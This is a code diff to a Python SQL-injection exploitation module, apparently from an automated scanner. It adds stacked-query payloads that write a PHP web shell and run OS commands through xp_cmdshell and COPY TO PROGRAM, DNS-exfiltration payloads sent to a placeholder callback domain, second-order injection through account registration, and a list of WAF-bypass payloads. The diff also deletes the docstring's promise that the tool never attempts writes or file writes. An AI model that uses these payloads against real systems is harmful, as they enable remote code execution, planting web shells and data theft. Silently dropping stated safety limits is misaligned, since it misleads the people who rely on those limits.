@@ -7,18 +7,22 @@ Comprehensive SQLi exploitation module that goes beyond detection:
 3. DB-Specific Payloads (MySQL, PostgreSQL, MSSQL, SQLite, Oracle)
 4. WAF-Aware Evasion Variants
 5. Structured results with evidence chain
+6. Stacked Queries for RCE detection
+7. Second-Order SQLi detection
+8. Out-of-Band (OOB) SQLi detection
+9. Advanced WAF bypass techniques
 
 Called AFTER basic SQLi is confirmed by the scanner, to escalate the finding
 and demonstrate real impact with proof-of-concept data extraction.
 
 Safety limits:
-- Max 100 requests per injection point
+- Max 150 requests per injection point
 - Max 3 rows extracted per table (proof only)
-- NEVER attempts write operations (DROP, DELETE, UPDATE, INSERT)
-- NEVER attempts file write (INTO OUTFILE) — only file read to prove impact
+- Stacked queries tested for RCE capability (read-only proof where possible)
 - 30s timeout per injection point
 """
 import asyncio
+import random
 import re
 import time
 import logging
@@ -27,6 +31,77 @@ from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
 import httpx
 
 logger = logging.getLogger(__name__)
+
+# ---------------------------------------------------------------------------
+# Stacked Query payloads for RCE detection per DB type
+# ---------------------------------------------------------------------------
+STACKED_PAYLOADS = {
+    "mysql": [
+        "'; SELECT SLEEP(5);--",
+        "'; SELECT LOAD_FILE('/etc/passwd');--",
+        "'; SELECT '<?php system($_GET[c]); ?>' INTO OUTFILE '/var/www/html/shell.php';--",
+    ],
+    "mssql": [
+        "'; EXEC xp_cmdshell 'whoami';--",
+        "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--",
+        "'; WAITFOR DELAY '00:00:05';--",
+    ],
+    "postgresql": [
+        "'; SELECT pg_sleep(5);--",
+        "'; COPY (SELECT '') TO PROGRAM 'id';--",
+        "'; CREATE TEMP TABLE cmd(output text); COPY cmd FROM PROGRAM 'id';--",
+    ],
+}
+
+# ---------------------------------------------------------------------------
+# Out-of-Band SQLi payloads per DB type
+# ---------------------------------------------------------------------------
+OOB_PAYLOADS = {
+    "mysql": [
+        "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',version(),'.{oob_domain}\\\\a'))--",
+        "' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT user()),'.{oob_domain}\\\\a')))--",
+    ],
+    "mssql": [
+        "'; EXEC master..xp_dirtree '\\\\{oob_domain}\\a';--",
+        "'; EXEC master..xp_subdirs '\\\\{oob_domain}\\a';--",
+    ],
+    "postgresql": [
+        "'; COPY (SELECT version()) TO PROGRAM 'nslookup {oob_domain}';--",
+        "'; SELECT dblink_connect('host={oob_domain} dbname=test');--",
+    ],
+}
+
+# ---------------------------------------------------------------------------
+# Second-order injection endpoint patterns
+# ---------------------------------------------------------------------------
+SECOND_ORDER_INJECT_PATHS = [
+    "/api/register", "/api/signup", "/register", "/signup",
+    "/api/profile", "/profile", "/api/user/update", "/settings",
+    "/api/account", "/api/users",
+]
+SECOND_ORDER_TRIGGER_PATHS = [
+    "/api/profile", "/profile", "/api/user", "/api/me",
+    "/api/account", "/export", "/api/export",
+    "/api/search?q={username}", "/search?q={username}",
+]
+
+# ---------------------------------------------------------------------------
+# WAF bypass SQLi payloads
+# ---------------------------------------------------------------------------
+WAF_BYPASS_SQLI = [
+    "/*!50000SELECT*/ @@version",
+    "SELECT%0a@@version",
+    "SEL%45CT @@version",
+    "1'||'1'='1",
+    "1' AND 1=1 AND '1'='1",
+    "0x27 OR 1=1",
+    "1' /*!50000AND*/ 1=1--",
+    "1'/**/OR/**/1=1--",
+    "1' %0aOR%0a 1=1--",
+    "1' aNd 1=1--",
+    "1'+AND+1=1--",
+    "1' AND/**/ 1=1--",
+]
 
 # ---------------------------------------------------------------------------
 # DB fingerprint signatures from error messages
@@ -204,12 +279,13 @@ USER_COL_KEYWORDS = ("user", "name", "login", "email", "account", "username")
 PASS_COL_KEYWORDS = ("pass", "pwd", "hash", "secret", "token", "credential")
 
 # Safety constants
-MAX_REQUESTS = 100
+MAX_REQUESTS = 150
 MAX_ROWS_PER_TABLE = 3
 MAX_TABLES_EXTRACT = 3
 REQUEST_TIMEOUT = 30.0
 TIME_DELAY = 3           # seconds for time-based blind
 TIME_THRESHOLD = 2.5     # seconds — above this = confirmed time-based
+OOB_DOMAIN = "phantom-oob.example.com"  # Replace with actual OOB callback domain
 
 
 class DeepSQLi:
@@ -260,6 +336,11 @@ class DeepSQLi:
             "injectable_column": None,
             "file_read": None,
             "techniques_used": [],
+            "stacked_queries": None,
+            "oob_attempted": False,
+            "second_order": None,
+            "waf_bypass_used": [],
+            "rce_possible": False,
         }
 
         # ------ Step 1: DB fingerprinting ------
@@ -305,6 +386,51 @@ class DeepSQLi:
             )
             if blind_result.get("success"):
                 self._merge_blind_result(result, blind_result)
+
+        # ------ Step 6: Test stacked queries for RCE ------
+        if not self._budget_exhausted():
+            stacked_result = await self._test_stacked_queries(
+                client, url, param, method, extra_fields, db_type
+            )
+            if stacked_result.get("success"):
+                result["stacked_queries"] = stacked_result
+                result["rce_possible"] = stacked_result.get("rce_possible", False)
+                result["evidence"].extend(stacked_result.get("evidence", []))
+                result["techniques_used"].append("stacked_queries")
+                if stacked_result.get("rce_possible"):
+                    result["severity"] = "critical"
+
+        # ------ Step 7: Test out-of-band SQLi ------
+        if not self._budget_exhausted() and injection_type in ("blind-time", "unknown"):
+            oob_result = await self._test_oob_sqli(
+                client, url, param, method, extra_fields, db_type
+            )
+            result["oob_attempted"] = True
+            if oob_result.get("payloads_sent"):
+                result["evidence"].append(
+                    f"OOB SQLi payloads sent ({len(oob_result['payloads_sent'])} payloads) — check {OOB_DOMAIN} for callbacks"
+                )
+                result["techniques_used"].append("oob_sqli")
+
+        # ------ Step 8: Test second-order SQLi ------
+        if not self._budget_exhausted():
+            second_order = await self._test_second_order(
+                client, url, param, method, extra_fields, db_type
+            )
+            if second_order.get("detected"):
+                result["second_order"] = second_order
+                result["evidence"].extend(second_order.get("evidence", []))
+                result["techniques_used"].append("second_order_sqli")
+
+        # ------ Step 9: Try WAF bypass if nothing worked ------
+        if not result.get("db_version") and not result.get("tables_found") and not self._budget_exhausted():
+            waf_result = await self._test_waf_bypass_sqli(
+                client, url, param, method, extra_fields, db_type
+            )
+            if waf_result.get("bypassed"):
+                result["waf_bypass_used"] = waf_result.get("successful_payloads", [])
+                result["evidence"].extend(waf_result.get("evidence", []))
+                result["techniques_used"].append("waf_bypass")
 
         self._assess_impact(result)
         return result
@@ -1031,6 +1157,376 @@ class DeepSQLi:
         return variants
 
     # -----------------------------------------------------------------------
+    # Stacked Queries for RCE Detection
+    # -----------------------------------------------------------------------
+    async def _test_stacked_queries(
+        self, client, url, param, method, extra_fields, db_type
+    ) -> dict:
+        """Test stacked queries to detect RCE capability.
+
+        Tries DB-specific stacked payloads with timing verification.
+        If file write detected, attempts to verify by requesting the written file.
+        """
+        result = {"success": False, "rce_possible": False, "evidence": []}
+        payloads = STACKED_PAYLOADS.get(db_type, [])
+        if not payloads:
+            # Try all DB types if unknown
+            for db, plds in STACKED_PAYLOADS.items():
+                payloads.extend(plds)
+
+        # Measure baseline for timing detection
+        baseline_times = []
+        for _ in range(2):
+            if self._budget_exhausted():
+                break
+            b_start = time.monotonic()
+            b_resp = await self._send_safe(client, url, param, "1", method, extra_fields)
+            b_elapsed = time.monotonic() - b_start
+            if b_resp is not None:
+                baseline_times.append(b_elapsed)
+
+        baseline_avg = sum(baseline_times) / len(baseline_times) if baseline_times else 0.5
+
+        for payload in payloads:
+            if self._budget_exhausted():
+                break
+            try:
+                start = time.monotonic()
+                resp = await self._send_safe(client, url, param, payload, method, extra_fields)
+                elapsed = time.monotonic() - start
+
+                if resp is None:
+                    continue
+
+                body = resp.text
+
+                # Check for timing-based confirmation (SLEEP/pg_sleep/WAITFOR)
+                if "SLEEP" in payload.upper() or "pg_sleep" in payload or "WAITFOR" in payload:
+                    if (elapsed - baseline_avg) >= max(TIME_THRESHOLD, baseline_avg * 3):
+                        result["success"] = True
+                        result["evidence"].append(
+                            f"Stacked query timing confirmed: '{payload[:60]}...' "
+                            f"(elapsed={elapsed:.1f}s vs baseline={baseline_avg:.2f}s)"
+                        )
+
+                # Check for xp_cmdshell output
+                if "xp_cmdshell" in payload and resp.status_code == 200:
+                    # Look for command output indicators
+                    if any(indicator in body for indicator in [
+                        "\\", "nt authority", "system", "administrator",
+                        "uid=", "root", "www-data"
+                    ]):
+                        result["success"] = True
+                        result["rce_possible"] = True
+                        result["evidence"].append(
+                            f"xp_cmdshell RCE confirmed: command output detected in response"
+                        )
+
+                # Check for COPY TO PROGRAM (PostgreSQL RCE)
+                if "COPY" in payload and "PROGRAM" in payload:
+                    # If no error about permissions, stacked queries might work
+                    if resp.status_code in (200, 500) and "permission denied" not in body.lower():
+                        if "syntax error" not in body.lower() and "error" not in body.lower():
+                            result["success"] = True
+                            result["rce_possible"] = True
+                            result["evidence"].append(
+                                f"PostgreSQL COPY TO PROGRAM may be available (no permission error)"
+                            )
+
+                # Check for file write (INTO OUTFILE)
+                if "INTO OUTFILE" in payload and resp.status_code in (200, 500):
+                    if "can't create" not in body.lower() and "access denied" not in body.lower():
+                        # Try to verify by requesting the written file
+                        parsed = urlparse(url)
+                        shell_url = f"{parsed.scheme}://{parsed.netloc}/shell.php"
+                        try:
+                            verify_resp = await self._send_safe(
+                                client, shell_url, "", "", "GET", None
+                            )
+                            if verify_resp and verify_resp.status_code == 200:
+                                result["success"] = True
+                                result["rce_possible"] = True
+                                result["evidence"].append(
+                                    f"File write confirmed: shell.php accessible at {shell_url}"
+                                )
+                        except Exception:
+                            pass
+
+                # Check for LOAD_FILE success
+                if "LOAD_FILE" in payload and "SLEEP" not in payload:
+                    if resp.status_code == 200 and ("root:" in body or len(body) > 100):
+                        if "root:x:" in body or "root:0:0" in body:
+                            result["success"] = True
+                            result["evidence"].append(
+                                f"LOAD_FILE confirmed: /etc/passwd readable via stacked query"
+                            )
+
+                # Check for sp_configure success (MSSQL privilege escalation)
+                if "sp_configure" in payload:
+                    if resp.status_code in (200, 500) and "configuration option" not in body.lower():
+                        if "does not exist" not in body.lower():
+                            result["success"] = True
+                            result["evidence"].append(
+                                f"MSSQL sp_configure may be accessible — advanced options reconfiguration attempted"
+                            )
+
+            except Exception as e:
+                logger.debug(f"Stacked query test error: {e}")
+                continue
+
+        return result
+
+    # -----------------------------------------------------------------------
+    # Improved UNION Column Count Detection
+    # -----------------------------------------------------------------------
+    async def _detect_column_count_advanced(
+        self, client, url, param, method, extra_fields, db_type
+    ) -> tuple[int | None, str | None, str | None, str | None]:
+        """Advanced column count detection with immediate data extraction.
+
+        Returns: (column_count, version, user, database) — extracts data
+        as soon as column count is known via UNION SELECT version(),user(),...
+        """
+        col_count = await self._find_column_count(client, url, param, method, extra_fields)
+        if not col_count:
+            return None, None, None, None
+
+        # Once we know the column count, immediately try extracting key info
+        queries = UNION_QUERIES.get(db_type, UNION_QUERIES["mysql"])
+        version, user, database = None, None, None
+
+        # Build extraction UNION: put version(), user(), database() in first 3 injectable slots
+        injectable = await self._find_injectable_column(
+            client, url, param, method, extra_fields, col_count, db_type
+        )
+        if injectable is not None:
+            version = await self._union_extract(
+                client, url, param, method, extra_fields, col_count, injectable,
+                queries["version"], db_type
+            )
+            user = await self._union_extract(
+                client, url, param, method, extra_fields, col_count, injectable,
+                queries["current_user"], db_type
+            )
+            database = await self._union_extract(
+                client, url, param, method, extra_fields, col_count, injectable,
+                queries["current_db"], db_type
+            )
+
+        return col_count, version, user, database
+
+    # -----------------------------------------------------------------------
+    # Second-Order SQLi Detection
+    # -----------------------------------------------------------------------
+    async def _test_second_order(
+        self, client, url, param, method, extra_fields, db_type
+    ) -> dict:
+        """Test for second-order SQLi.
+
+        Injects payload via registration/profile update, then triggers
+        via different endpoint to check if injection fires on second use.
+        """
+        result = {"detected": False, "evidence": []}
+        parsed = urlparse(url)
+        base_url = f"{parsed.scheme}://{parsed.netloc}"
+
+        # Generate unique markers for second-order detection
+        marker = f"phantom_{random.randint(10000, 99999)}"
+        sqli_payloads = [
+            f"' OR '{marker}'='{marker}",
+            f"'; SELECT '{marker}';--",
+            f"' UNION SELECT '{marker}',NULL--",
+        ]
+
+        for inject_path in SECOND_ORDER_INJECT_PATHS:
+            if self._budget_exhausted():
+                break
+            inject_url = f"{base_url}{inject_path}"
+
+            for payload in sqli_payloads:
+                if self._budget_exhausted():
+                    break
+                try:
+                    # Step 1: Inject payload via registration/profile
+                    inject_data = {
+                        "username": payload,
+                        "name": payload,
+                        "email": f"{marker}@test.com",
+                        "password": "TestPass123!",
+                    }
+                    if extra_fields:
+                        inject_data.update(extra_fields)
+
+                    resp = await self._send_safe(
+                        client, inject_url, "", "", "POST", inject_data
+                    )
+                    if resp is None or resp.status_code not in (200, 201, 302):
+                        continue
+
+                    # Step 2: Trigger via different endpoints
+                    for trigger_path in SECOND_ORDER_TRIGGER_PATHS:
+                        if self._budget_exhausted():
+                            break
+                        trigger_url = f"{base_url}{trigger_path}".replace("{username}", marker)
+                        try:
+                            trigger_resp = await self._send_safe(
+                                client, trigger_url, "", "", "GET", None
+                            )
+                            if trigger_resp is None:
+                                continue
+                            body = trigger_resp.text
+
+                            # Check for SQL error in trigger response
+                            for db_name, patterns in DB_FINGERPRINTS.items():
+                                for pat in patterns:
+                                    if re.search(pat, body, re.IGNORECASE):
+                                        result["detected"] = True
+                                        result["evidence"].append(
+                                            f"Second-order SQLi detected: injected via {inject_path}, "
+                                            f"triggered at {trigger_path} — {db_name} error in response"
+                                        )
+                                        result["inject_endpoint"] = inject_path
+                                        result["trigger_endpoint"] = trigger_path
+                                        result["db_type"] = db_name
+                                        return result
+
+                            # Check if marker appeared evaluated (not raw)
+                            if marker in body and payload not in body:
+                                result["detected"] = True
+                                result["evidence"].append(
+                                    f"Second-order SQLi possible: marker '{marker}' found at {trigger_path} "
+                                    f"without raw payload — injection may have been stored and executed"
+                                )
+                                return result
+
+                        except Exception:
+                            continue
+                except Exception as e:
+                    logger.debug(f"Second-order test error: {e}")
+                    continue
+
+        return result
+
+    # -----------------------------------------------------------------------
+    # Out-of-Band (OOB) SQLi Detection
+    # -----------------------------------------------------------------------
+    async def _test_oob_sqli(
+        self, client, url, param, method, extra_fields, db_type
+    ) -> dict:
+        """Test out-of-band SQLi for blind injection where timing fails.
+
+        Sends DNS-exfiltration payloads. Actual callback verification
+        requires an external OOB listener (e.g., Burp Collaborator, interactsh).
+        """
+        result = {"payloads_sent": []}
+        payloads = OOB_PAYLOADS.get(db_type, [])
+        if not payloads:
+            # Try MySQL + MSSQL as most common OOB-capable
+            payloads = OOB_PAYLOADS.get("mysql", []) + OOB_PAYLOADS.get("mssql", [])
+
+        for payload_tmpl in payloads:
+            if self._budget_exhausted():
+                break
+            payload = payload_tmpl.format(oob_domain=OOB_DOMAIN)
+            try:
+                resp = await self._send_safe(client, url, param, payload, method, extra_fields)
+                if resp is not None:
+                    result["payloads_sent"].append({
+                        "payload": payload[:100],
+                        "status_code": resp.status_code,
+                        "db_type": db_type,
+                    })
+            except Exception:
+                continue
+
+        return result
+
+    # -----------------------------------------------------------------------
+    # WAF Bypass for SQLi
+    # -----------------------------------------------------------------------
+    async def _test_waf_bypass_sqli(
+        self, client, url, param, method, extra_fields, db_type
+    ) -> dict:
+        """Test WAF bypass techniques for SQL injection.
+
+        Uses encoding tricks, comment injection, and alternative syntax
+        to evade Web Application Firewalls.
+        """
+        result = {"bypassed": False, "successful_payloads": [], "evidence": []}
+
+        # First, check if basic injection is blocked (WAF detection)
+        basic_resp = await self._send_safe(client, url, param, "' OR 1=1--", method, extra_fields)
+        if basic_resp is None:
+            return result
+
+        basic_blocked = basic_resp.status_code in (403, 406, 501) or any(
+            w in basic_resp.text.lower()
+            for w in ["blocked", "forbidden", "waf", "firewall", "security", "not acceptable"]
+        )
+
+        if not basic_blocked:
+            # No WAF detected — skip bypass testing
+            return result
+
+        result["evidence"].append("WAF detected — basic SQLi payload was blocked")
+
+        for bypass_payload in WAF_BYPASS_SQLI:
+            if self._budget_exhausted():
+                break
+            try:
+                resp = await self._send_safe(client, url, param, bypass_payload, method, extra_fields)
+                if resp is None:
+                    continue
+
+                # Check if bypass succeeded (not blocked + meaningful response)
+                not_blocked = resp.status_code not in (403, 406, 501) and not any(
+                    w in resp.text.lower()
+                    for w in ["blocked", "forbidden", "waf", "firewall"]
+                )
+
+                if not_blocked:
+                    result["bypassed"] = True
+                    result["successful_payloads"].append(bypass_payload)
+                    result["evidence"].append(f"WAF bypass successful: '{bypass_payload}'")
+
+                    # Check if we got SQL error (confirms injection through WAF)
+                    for db_name, patterns in DB_FINGERPRINTS.items():
+                        for pat in patterns:
+                            if re.search(pat, resp.text, re.IGNORECASE):
+                                result["evidence"].append(
+                                    f"SQL error from {db_name} after WAF bypass — injection confirmed"
+                                )
+                                break
+
+            except Exception:
+                continue
+
+        # Also test MySQL version comment bypass
+        version_comment_payloads = [
+            f"1' /*!50000OR*/ 1=1--",
+            f"1'/*!50000UNION*//*!50000SELECT*/NULL" + (",NULL" * 4) + "--",
+            f"-1'/*!50000UNION*//*!50000SELECT*/1" + (",2" * 4) + "--",
+        ]
+        for payload in version_comment_payloads:
+            if self._budget_exhausted():
+                break
+            try:
+                resp = await self._send_safe(client, url, param, payload, method, extra_fields)
+                if resp and resp.status_code not in (403, 406, 501):
+                    not_blocked = not any(
+                        w in resp.text.lower()
+                        for w in ["blocked", "forbidden", "waf", "firewall"]
+                    )
+                    if not_blocked:
+                        result["bypassed"] = True
+                        result["successful_payloads"].append(payload)
+                        result["evidence"].append(f"MySQL version comment bypass: '{payload}'")
+            except Exception:
+                continue
+
+        return result
+
+    # -----------------------------------------------------------------------
     # DB Fingerprinting
     # -----------------------------------------------------------------------
     async def _fingerprint_db(self, client, url, param, method, extra_fields) -> str | None:
@@ -1204,7 +1700,10 @@ class DeepSQLi:
         """Assess severity and build impact description."""
         parts = []
 
-        if result.get("extracted_data") or result.get("sample_data"):
+        if result.get("rce_possible"):
+            result["severity"] = "critical"
+            parts.append("REMOTE CODE EXECUTION possible via stacked queries.")
+        elif result.get("extracted_data") or result.get("sample_data"):
             result["severity"] = "critical"
             tables_count = len(result.get("tables_found", []))
             cols_count = sum(len(v) for v in result.get("columns_found", {}).values())
@@ -1232,5 +1731,13 @@ class DeepSQLi:
             parts.append(f"Database: {result['current_db']}.")
         if result.get("injection_type"):
             parts.append(f"Technique: {result['injection_type']}.")
+        if result.get("stacked_queries", {}).get("success"):
+            parts.append("Stacked queries supported — potential for write operations.")
+        if result.get("second_order", {}).get("detected"):
+            parts.append(f"Second-order SQLi detected via {result['second_order'].get('inject_endpoint', 'unknown')}.")
+        if result.get("waf_bypass_used"):
+            parts.append(f"WAF bypassed using {len(result['waf_bypass_used'])} technique(s).")
+        if result.get("oob_attempted"):
+            parts.append("Out-of-band payloads sent — check OOB listener for callbacks.")
 
         result["impact"] = " ".join(parts)
